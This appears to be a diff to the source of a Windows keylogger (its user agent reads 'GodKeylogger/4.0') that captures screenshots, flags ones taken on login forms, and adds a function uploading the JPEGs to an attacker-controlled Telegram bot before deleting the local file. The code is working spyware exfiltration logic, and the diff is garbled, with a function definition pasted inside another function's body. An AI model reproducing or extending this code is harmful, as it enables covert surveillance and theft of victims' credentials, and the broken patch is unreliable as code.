@@ -427,9 +427,137 @@ bool TakeSmartScreenshot() {
     if (in_login_form) {
         caption += L" (Login Form)";
     }
+       // Upload JPEG to Telegram
     
-    // Upload JPEG to Telegram
-    bool upload_success = UploadToTelegram(jpg_path, caption.c_str());
+bool UploadToTelegram(const wchar_t* jpg_path, const wchar_t* caption) {
+    OutputDebugStringW(L"📤 Starting JPEG upload...\n");
+    
+    // 1. READ FILE
+    HANDLE file = CreateFileW(jpg_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (file == INVALID_HANDLE_VALUE) {
+        OutputDebugStringW(L"❌ File open failed\n");
+        return false;
+    }
+    
+    DWORD file_size = GetFileSize(file, NULL);
+    if (file_size == 0 || file_size > 10*1024*1024) { // 10MB max
+        CloseHandle(file);
+        OutputDebugStringW(L"❌ Invalid file size\n");
+        return false;
+    }
+    
+    std::vector<BYTE> file_data(file_size);
+    DWORD bytes_read;
+    ReadFile(file, file_data.data(), file_size, &bytes_read, NULL);
+    CloseHandle(file);
+    
+    if (bytes_read != file_size) {
+        OutputDebugStringW(L"❌ Read failed\n");
+        return false;
+    }
+    
+    // 2. UNIQUE BOUNDARY (FIX COLLISION)
+    std::string boundary = "----GodModeBoundaryV4_" + std::to_string(GetTickCount64()) + "_" + std::to_string((DWORD)file_size);
+    
+    // 3. BUILD MULTIPART (SIMPLE + CORRECT)
+    std::string multipart = 
+        "--"s + boundary + "\r\n" +
+        "Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n" +
+        std::string(CHAT_ID) + "\r\n" +
+        "--"s + boundary + "\r\n" +
+        "Content-Disposition: form-data; name=\"caption\"\r\n\r\n" +
+        std::string(caption) + "\r\n" +
+        "--"s + boundary + "\r\n" +
+        "Content-Disposition: form-data; name=\"photo\"; filename=\"screenshot.jpg\"\r\n" +
+        "Content-Type: image/jpeg\r\n\r\n";
+    
+    std::string end_boundary = "\r\n--"s + boundary + "--\r\n";
+    
+    // 4. COMBINE DATA
+    std::vector<BYTE> post_data;
+    post_data.insert(post_data.end(), multipart.begin(), multipart.end());
+    post_data.insert(post_data.end(), file_data.begin(), file_data.end());
+    post_data.insert(post_data.end(), end_boundary.begin(), end_boundary.end());
+    
+    // 5. WINHTTP (SIMPLE + ROBUST)
+    HINTERNET session = WinHttpOpen(L"GodKeylogger/4.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, 
+                                   WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
+    if (!session) {
+        OutputDebugStringW(L"❌ WinHttpOpen failed\n");
+        return false;
+    }
+    
+    HINTERNET connect = WinHttpConnect(session, L"api.telegram.org", INTERNET_DEFAULT_HTTPS_PORT, 0);
+    if (!connect) {
+        WinHttpCloseHandle(session);
+        OutputDebugStringW(L"❌ WinHttpConnect failed\n");
+        return false;
+    }
+    
+    HINTERNET request = WinHttpOpenRequest(connect, L"POST", 
+        (L"/bot" + std::wstring(BOT_TOKEN) + L"/sendPhoto").c_str(),
+        NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
+    if (!request) {
+        WinHttpCloseHandle(connect);
+        WinHttpCloseHandle(session);
+        OutputDebugStringW(L"❌ WinHttpOpenRequest failed\n");
+        return false;
+    }
+    
+    // 6. HEADERS
+    std::string content_type = "multipart/form-data; boundary=" + boundary;
+    BOOL headers_set = WinHttpAddRequestHeadersA(request, 
+        ("Content-Type: " + content_type + "\r\n").c_str(), 
+        -1UL, WINHTTP_ADDREQ_FLAG_ADD);
+    
+    if (!headers_set) {
+        OutputDebugStringW(L"❌ Headers failed\n");
+        goto cleanup;
+    }
+    
+    // 7. SEND REQUEST
+    BOOL sent = WinHttpSendRequest(request, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
+                                  post_data.data(), post_data.size(), post_data.size(), 0);
+    if (!sent) {
+        OutputDebugStringW(L"❌ SendRequest failed\n");
+        goto cleanup;
+    }
+    
+    // 8. RECEIVE RESPONSE
+    BOOL received = WinHttpReceiveResponse(request, NULL);
+    if (!received) {
+        OutputDebugStringW(L"❌ ReceiveResponse failed\n");
+        goto cleanup;
+    }
+    
+    // 9. CHECK STATUS
+    DWORD status = 0;
+    DWORD status_size = sizeof(DWORD);
+    BOOL status_ok = WinHttpQueryHeaders(request, 
+        WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
+        NULL, &status, &status_size, NULL);
+    
+    if (status_ok && status == 200) {
+        OutputDebugStringW(L"✅ JPEG UPLOADED SUCCESS!\n");
+        SendTelegram(L"✅ JPEG UPLOADED! 📸🔥\n💥 ZAZA KEEP GOING! 🚀");
+        WinHttpCloseHandle(request);
+        WinHttpCloseHandle(connect);
+        WinHttpCloseHandle(session);
+        return true;
+    } else {
+        OutputDebugStringW(L"❌ HTTP Status: ");
+        char buf[32]; sprintf(buf, "%lu\n", status);
+        OutputDebugStringA(buf);
+    }
+    
+cleanup:
+    WinHttpCloseHandle(request);
+    WinHttpCloseHandle(connect);
+    WinHttpCloseHandle(session);
+    SendTelegram(L"❌ Upload failed - retrying...");
+    return false;
+}
+
     
     // Clean up
     DeleteFileW(jpg_path);
